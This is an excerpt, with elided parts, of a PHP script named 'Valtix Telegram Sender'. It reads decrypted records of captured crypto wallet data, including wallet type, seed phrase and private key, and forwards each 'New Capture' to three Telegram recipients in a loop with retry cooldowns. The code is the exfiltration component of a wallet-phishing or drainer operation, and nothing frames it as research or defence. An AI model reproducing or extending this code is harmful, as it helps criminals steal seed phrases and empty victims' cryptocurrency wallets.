 ...
 * Sends to THREE recipients with wallet type and full seed.
 */
...
function sendTelegram($botToken, $chatId, $record) {
    $wallet  = !empty($record['wallet']) ? ucfirst($record['wallet']) : 'Unknown';
    $hasSeed = !empty($record['seed']);
    $hasKey  = !empty($record['pkey']);

    $walletEmojis = [
        'phantom' => '👻', 'metamask' => '🦊', 'trust' => '🔷',
        'solflare' => '☀️', 'coinbase' => '🔵', 'backpack' => '🎒',
        'okx' => '⭕', 'rabby' => '💎'
    ];
    $emoji = $walletEmojis[strtolower($wallet)] ?? '👛';

    $message = "🚨 **Valtix — New Capture** 🚨\n\n";
    $message .= "$emoji **Wallet:** $wallet\n";
...
$lastSent = 0;
if (file_exists($STATE_FILE)) $lastSent = (int) file_get_contents($STATE_FILE);

echo "[Valtix Telegram Sender] Started. Last sent: line $lastSent\n";
echo "[Recipients]: " . implode(', ', $TELEGRAM_CHAT_IDS) . "\n";

$failCount = 0;
$cooldownUntil = 0;

while (true) {
    if (time() < $cooldownUntil) { sleep(5); continue; }
            ...
            for ($i = $lastSent; $i < $totalLines; $i++) {
                ...
                if ($decrypted) {
                    ...
                    if ($record && isset($record['id'])) {
                        ...
                        if ($allSent) {
                            echo "[SENT #$i] {$record['id']} | Wallet: {$record['wallet']}\n";
                            $lastSent = $i + 1;
                            ...
                            if ($failCount >= 5) {
                                echo "[COOLDOWN] Too many failures. Waiting 5 min...\n";
                                $cooldownUntil = time() + 300;
                                $failCount = 0;
                                break;
                            }
                            sleep(2);
